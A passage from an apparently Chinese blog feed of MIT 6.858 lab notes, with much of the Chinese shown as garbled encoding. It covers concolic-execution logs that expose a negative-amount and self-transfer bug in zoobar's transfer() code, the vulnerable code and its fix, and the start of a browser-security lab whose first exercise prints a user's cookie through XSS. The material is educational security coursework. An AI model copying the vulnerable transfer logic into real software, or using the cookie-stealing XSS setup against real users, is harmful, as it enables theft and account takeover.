class="hljs-string">Trying concrete value: &#123;&#x27;</span>form_recipient_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_val<span class="hljs-string">&#x27;: &#x27;</span>-<span class="hljs-number">10</span><span class="hljs-string">&#x27;, &#x27;</span>rsplit_split_cookie_=_r_<span class="hljs-comment">#_r&#x27;: &#x27;atok&#x27;, &#x27;rsplit_split_cookie_=_r_#_l&#x27;: &#x27;alice&#x27;, &#x27;split_cookie_=_r&#x27;: &#x27;alice#atok&#x27;, &#x27;split_cookie_=_l&#x27;: &#x27;PyZoobarLogin&#x27;, &#x27;cookie&#x27;: &#x27;PyZoobarLogin=alice#atok&#x27;, &#x27;path&#x27;: &#x27;fer&#x27;, &#x27;form_recipient_val&#x27;: &#x27;bob&#x27;, &#x27;referrer&#x27;: &#x27;&#x27;&#125;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1686</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;tex...</span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br><span class="hljs-string">WARNING: Zoobar theft detected</span><br></code></pre></td></tr></table></figure><p>å‚æ•°çš„å«ä¹‰ä¸éš¾è¾¨è®¤ï¼Œ<code>form_zoobars_val</code> ä¸ºå•æ¬¡ transfer çš„æ•°å€¼ï¼Œ<code>cookie</code> è¡¨ç¤ºå‘é€æ–¹ç”¨æˆ·ååŠ cookieï¼Œ<code>form_recipient_val</code> è¡¨ç¤ºæ¥æ”¶æ–¹ç”¨æˆ·åï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºè‡³å°‘å¯èƒ½å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼š</p><ul><li>æœªå¯¹è´Ÿæ•°çš„ transfer è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ä¸€ä¸ªç”¨æˆ·å¯ä»¥ç›—å–å¦ä¸€ç”¨æˆ·çš„ balance</li><li>æœªå¯¹ self-transfer çš„æƒ…å†µåšåˆé€‚å¤„ç†ï¼Œå¯¼è‡´æœ€åæ€»çš„ balance ä¸ä¸€è‡´</li></ul><p>ä½†è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªçŸ¥é“  <em>æ¼æ´æ˜¯å­˜åœ¨çš„</em>  ï¼Œè€Œä¸çŸ¥é“  <em>æ¼æ´åœ¨ä½•å¤„</em>  ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬éœ€è¦å†å®¡ä¸€å®¡æ—¥å¿—åˆ«çš„åœ°æ–¹ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ä¼šæœ‰ä¸€äº›æŠ›å¼‚å¸¸çš„æ—¥å¿—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/transfer.py&quot;</span>, line <span class="hljs-number">16</span>, <span class="hljs-keyword">in</span> transfer<br>    bank.transfer(g.user.person.username,<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/bank.py&quot;</span>, line <span class="hljs-number">12</span>, <span class="hljs-keyword">in</span> transfer<br>    recipient_balance = recipientp.zoobars + zoobars<br>AttributeError: <span class="hljs-string">&#x27;NoneType&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;zoobars&#x27;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1683</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n       </span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br></code></pre></td></tr></table></figure><p>è¯´æ˜ä¸»è¦çš„å¤„ç†é€»è¾‘åº”å½“æ˜¯åœ¨ <code>zoobar/bank.py</code> ä¸­çš„ <code>transfer()</code> å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä»£ç å®¡è®¡+ä¿®å¤ç¯èŠ‚äº†ï¼Œè¯¥å‡½æ•°çš„æ ¸å¿ƒé€»è¾‘ä¸»è¦å°±æ˜¯å¼€å¤´è¿™ä¸€æ®µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    persondb = person_setup()<br>    senderp = persondb.query(Person).get(sender)<br>    recipientp = persondb.query(Person).get(recipient)<br><br>    sender_balance = senderp.zoobars - zoobars<br>    recipient_balance = recipientp.zoobars + zoobars<br><br>    <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError()<br><br>    senderp.zoobars = sender_balance<br>    recipientp.zoobars = recipient_balance<br>    persondb.commit()<br><br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼š</p><ul><li>ç¼ºå¤±äº†å¯¹ transfer æ•°é‡ä¸ºè´Ÿçš„æ£€æŸ¥</li><li>é‡å¤èµ‹å€¼å¯¼è‡´å¯¹ self-transfer çš„æƒ…å†µè®¡ç®—é”™è¯¯</li></ul><p>ä¿®æ”¹çš„åŠæ³•å…¶å®æ¯”è¾ƒç®€å•ï¼Œç”±äº username ä¸ºä¸»é”®ï¼Œæ•…è‹¥ <code>sender == recipient</code>ï¼Œç›´æ¥è·³è¿‡è½¬è´¦æ“ä½œå³å¯ï¼ŒåŒæ—¶å¯¹ transfer æ•°é‡ä¸ºè´Ÿæ•°çš„æƒ…å†µç›´æ¥è½¬ä¸º 0 å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    <span class="hljs-comment"># for zoobars &lt; 0, convert it to 0</span><br>    <span class="hljs-keyword">if</span> zoobars &lt; <span class="hljs-number">0</span>:<br>        zoobars = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-comment"># if self-transfer, we don&#x27;t need to do anything</span><br>    <span class="hljs-keyword">if</span> sender != recipient:<br>        persondb = person_setup()<br>        senderp = persondb.query(Person).get(sender)<br>        recipientp = persondb.query(Person).get(recipient)<br><br>        sender_balance = senderp.zoobars - zoobars<br>        recipient_balance = recipientp.zoobars + zoobars<br><br>        <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError()<br><br>        senderp.zoobars = sender_balance<br>        recipientp.zoobars = recipient_balance<br>        persondb.commit()<br>    <br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡æ‰€æœ‰æ£€æŸ¥</p><p><img src="https://s2.loli.net/2022/12/25/GYVItmEXyuZCUfo.png" alt="image.png"></p><p>è‡³æ­¤ï¼ŒLab 3 å…¨éƒ¨å®Œæˆ</p><h1 id="0x04-Lab-4-Browser-securityï¼ˆuncompletedï¼‰"><a href="#0x04-Lab-4-Browser-securityï¼ˆuncompletedï¼‰" class="headerlink" title="0x04.Lab 4: Browser securityï¼ˆuncompletedï¼‰"></a>0x04.Lab 4: Browser securityï¼ˆuncompletedï¼‰</h1><h2 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h2><p>æœ¬ Lab ä¸»è¦å¸¦å¤§å®¶åšåŸºäºæµè§ˆå™¨çš„æ”»å‡»ï¼ˆbrowser-based attacksï¼Œå…¶å®å°±æ˜¯ web æ‰‹ç©çš„é‚£ä¸€å¥—ï¼‰ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>Part 1ï¼šè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆcross-site scripting attackï¼ŒXSSï¼‰</li><li>Part 2ï¼šä¾§ä¿¡é“ä¸é’“é±¼æ”»å‡»ï¼ˆside channel and phishing attackï¼‰</li><li>Part 3ï¼šä¸€ä¸ªç®€å•çš„è •è™«ï¼ˆa profile wormï¼‰</li></ul><h2 id="Network-setup"><a href="#Network-setup" class="headerlink" title="Network setup"></a>Network setup</h2><p>å› ä¸ºæˆ‘ä»¬éœ€è¦åœ¨ web æµè§ˆå™¨æ„é€ æ”»å‡»ï¼Œä¸ºäº†ä¿è¯è¯„åˆ†ç³»ç»Ÿæ­£å¸¸ï¼Œæˆ‘ä»¬çš„ zoobar web æœåŠ¡å™¨å¿…é¡»è¦åœ¨ <code>http://localhost:8080/</code> ä¸Šè¿›è¡Œè®¿é—®</p><p><del>å¦‚æœä½ æ˜¯ä½¿ç”¨ KVM æˆ– VirtualBoxï¼Œè‡ªå·±å›å»ç¿»å®éªŒæ‰‹å†Œ</del>ï¼›å¦‚æœä½ ä½¿ç”¨ VMWareï¼Œæˆ‘ä»¬å°†é€šè¿‡ ssh è¿›è¡Œç«¯å£è½¬å‘</p><p>é¦–å…ˆæ‰¾åˆ°ä½ çš„è™šæ‹Ÿæœºçš„ IPï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip addr show dev eth0</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/25/COioRUJdS81apIG.png" alt="image.png"></p><p>å¯¹äº Mac å’Œ Linux ç”¨æˆ·ï¼Œåœ¨å®¿ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh -L localhost:8080:localhost:8080 student@VM-IP-ADDRESS</span><br>student@VM-IP-ADDRESS&#x27;s password: 6858<br></code></pre></td></tr></table></figure><p>å¯¹äº Windows ç”¨æˆ·ï¼Œ<del>æ²¡æ•‘äº†ç­‰æ­»å§</del>ï¼Œå¦‚æœä½ ç”¨çš„æ˜¯ PuTTYï¼Œå¯ä»¥æ ¹æ®è¿™äº›  <a href="https://web.archive.org/web/20140811071925/http://www.cs.uu.nl/technical/services/ssh/putty/puttyfw.html">instructions</a> å®Œæˆè®¾ç½®ï¼Œ<del>å¦‚æœä½ ç”¨çš„æ˜¯ OpenSSH é‚£å°±ç­‰æ­»å§</del></p><h2 id="Web-browser"><a href="#Web-browser" class="headerlink" title="Web browser"></a>Web browser</h2><p>æœ¬ Lab æ¨èä½¿ç”¨  <a href="https://www.mozilla.com/firefox/">Mozilla Firefox</a> ï¼Œ <del>è¯´æ˜¯ Firefox å¯ä»¥åœ¨è®¸å¤šç§OS ä¸Šè·‘ä½†ğŸ‘´å¯»æ€ Chrome ä¸ç…§æ ·èƒ½è€Œä¸”åº”ç”¨èŒƒå›´ä¸çŸ¥é“æ¯” Firefox å¤šå¤šå°‘äº†</del> ï¼Œè‹¥å¼€å¯äº† ad-blocking ç­‰æ’ä»¶åˆ™éœ€è¦å°†å…¶å…³é—­</p><h2 id="Setting-up-the-web-server"><a href="#Setting-up-the-web-server" class="headerlink" title="Setting up the web server"></a>Setting up the web server</h2><p>é¦–å…ˆè¿˜æ˜¯æŒ‰æƒ¯ä¾‹ä¿å­˜ Lab 3 çš„ç­”æ¡ˆï¼Œåˆ‡åˆ° Lab 4 åˆ†æ”¯ï¼Œmake ä¸€ä¸‹æ£€æŸ¥æœ‰æ²¡æœ‰é—®é¢˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~$ cd lab<br>student@vm-6858:~/lab$ git commit -am &#x27;my solution to lab3&#x27;<br>[lab3 c54dd4d] my solution to lab3<br> 1 files changed, 1 insertions(+), 0 deletions(-)<br>student@vm-6858:~/lab$ git pull<br>Already up-to-date.<br>student@vm-6858:~/lab$ git checkout -b lab4 origin/lab4<br>Branch lab4 set up to track remote branch lab4 from origin.<br>Switched to a new branch &#x27;lab4&#x27;<br>student@vm-6858:~/lab$ make<br>...<br></code></pre></td></tr></table></figure><p>ç„¶åæŒ‰æƒ¯ä¾‹ç”¨ä¸‹é¢çš„è¯­å¥åœ¨ 8080 ç«¯å£è·‘ zookdï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~/lab$ ./zookd 8080<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨  <code>http://localhost:8080/</code> å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ Zoobar é¡µé¢<del>è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„è€æ ·å­</del></p><p><img src="https://s2.loli.net/2022/12/25/dU7ZvOKPLX4mzs9.png" alt="image.png"></p><h2 id="Crafting-attacks"><a href="#Crafting-attacks" class="headerlink" title="Crafting attacks"></a>Crafting attacks</h2><p>æœ¬ Lab ä¸­æˆ‘ä»¬å°†ç”¨ä¸åŒçš„æ”»å‡»æ‰‹æ®µæ¥æ”»å‡» zoobarï¼Œè¯„æµ‹ç³»ç»Ÿå°†åœ¨æ¸…ç©ºæ³¨å†Œç”¨æˆ·æ•°æ®åº“ï¼ˆé™¤äº† <code>&quot;attacker&quot;</code> ç”¨æˆ·ï¼‰åè¿è¡Œæˆ‘ä»¬çš„æ”»å‡»è„šæœ¬ï¼Œä¸å‰é¢çš„ Lab ç±»ä¼¼çš„æ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡ <code>make check</code> æ¥è¿›è¡Œæ£€æŸ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥æ£€æŸ¥å¹¶ä¸å¤Ÿå½»åº•ï¼ˆå°¤å…¶æ˜¯å¯¹äºæ¡ä»¶ç«äº‰è€Œè¨€ï¼‰ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¤šè¿è¡Œå‡ æ¬¡æ¥ç¡®è®¤æ”»å‡»æˆåŠŸ</p><p>å¯¹äº Exercise 5ã€13ã€14 ä¸ challenge è€Œè¨€ï¼Œ<code>make check</code> è„šæœ¬ä¸è¶³ä»¥çœ‹å‡ºç«™ç‚¹åœ¨æ”»å‡»å‰åçš„åŒºåˆ«ï¼Œå› æ­¤è¿™éœ€è¦æˆ‘ä»¬è‡ªè¡Œå®Œæˆå¯¹æ¯”ï¼ˆMIT çš„è€å¸ˆä¹Ÿä¼šæ‰‹åŠ¨å®Œæˆè¯„æµ‹ï¼Œ <del>ä»–çœŸçš„ğŸ‘´å“­æ­»</del> ï¼‰ï¼›<code>make check</code> åœ¨è¿è¡Œæ—¶ä¼šåœ¨ <code>lab4-tests/</code> ä¸‹ç”Ÿæˆæ”»å‡»é¡µé¢åº”æœ‰çš„å¤–è§‚çš„å›¾ç‰‡ï¼ˆ<code>answer-XX.ref.png</code>ï¼‰ä¸æˆ‘ä»¬çš„æ”»å‡»é¡µé¢çš„å®é™…çš„æ ·å­ï¼ˆ<code>answer-XX.png</code>ï¼‰ï¼Œæˆ‘ä»¬åº”å½“è¦ç¡®ä¿ä¸¤è€…åº”å½“ä¸€è‡´</p><h2 id="Part-1-a-cross-site-scripting-XSS-attack"><a href="#Part-1-a-cross-site-scripting-XSS-attack" class="headerlink" title="Part 1: a cross-site scripting (XSS) attack"></a>Part 1: a cross-site scripting (XSS) attack</h2><p>zoobar çš„ç”¨æˆ·ç•Œé¢æœ‰ä¸€ä¸ªèƒ½ä»ç™»å…¥ç”¨æˆ·çš„æµè§ˆå™¨çªƒå–å…¶ cookie çš„æ¼æ´ï¼ˆè‹¥æ”»å‡»è€…èƒ½è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è¿æ¥ï¼‰ï¼Œæˆ‘ä»¬çš„å·¥ä½œä¾¿æ˜¯æ„é€ è¿™æ ·ä¸€ä¸ªé“¾æ¥</p><p>éœ€æ±‚çš„å‰ç½®çŸ¥è¯†ï¼šJavascriptï¼ŒDOM ç­‰</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼Œåœ¨  <code>answer-1.js</code> ä¸­ç¼–å†™æ”»å‡»è„šæœ¬æ‰“å°å‡ºç”¨æˆ·çš„ cookieï¼Œæœ¬åœ°æµ‹è¯•çš„è¯å°±ä¿ç•™ä¸€ä»½ <code>zoobar/templates/users.html</code> çš„æ‹·è´å¹¶æ·»åŠ   <code>&lt;script&gt;</code>  æ ‡ç­¾æ¥å¼•å…¥æ”»å‡»è„šæœ¬ï¼š</p><blockquote><p><strong>Exercise 1: Print cookie.</strong></p><p>Cookies are HTTPâ€™s main mechanism for tracking users across requests. If an attacker can get ahold of another userâ€™s cookie, they can completely impersonate that other user. For this exercise, your goal is simply to print the cookie of the currently logged-in user when they access the â€œUsersâ€ page.</p><ol><li><p>Read about how <a href="https://developer.mozilla.org/en-US/docs/Web/API/document.cookie">cookies are accessed from Javascript</a>.</p></li><li><p>Save a copy of <code>zoobar/templates/users.html</code> (youâ€™ll need to restore this original version later). Add a <code>&lt;script&gt;</code> tag to <code>users.html</code> that prints the logged-in userâ€™s cookie using <code>alert()</code></p><p>Your script might not work immediately if you made a Javascript programming error. Fortunately, Chrome has fantastic debugging tools accessible in the Inspector: the JavaScript console, the DOM inspector, and the Network monitor. The JavaScript console lets you see which exceptions are being thrown and why. The DOM Inspector lets you peek at the structure of the page and the properties and methods of each node it contains. The Network monitor allows you to inspect the requests going between your browser and the website. By clicking on one of the requests, you can see what cookie your browser is sending, and compare it to what your script prints.</p></li><li><p>Put the contents of your script in a file named <code>answer-1.js</code>. Your file should only contain javascript (donâ€™t include <code>&lt;script&gt;</code> tags).</p></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ„Ÿè§‰ä¸å¦‚ CTF 7 å¤©é€Ÿæˆè¯¾ç¨‹â€¦ç”»è´¨â€¦&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="https://arttnba3.github.io/categories/EXPERIMENTS/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ret2libc" scheme="https://arttnba3.github.io/tags/ret2libc/"/>
    
    <category term="æ ˆæº¢å‡º" scheme="https://arttnba3.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="ç¬¦å·æ‰§è¡Œ" scheme="https://arttnba3.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="ret2shellcode" scheme="https://arttnba3.github.io/tags/ret2shellcode/"/>
    
    <category term="å®éªŒç¬”è®°" scheme="https://arttnba3.github.io/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="https://arttnba3.github.io/tags/MIT/"/>
    
    <category term="Concolic Execution" scheme="https://arttnba3.github.io/tags/Concolic-Execution/"/>
    
  </entry>
  
</feed>
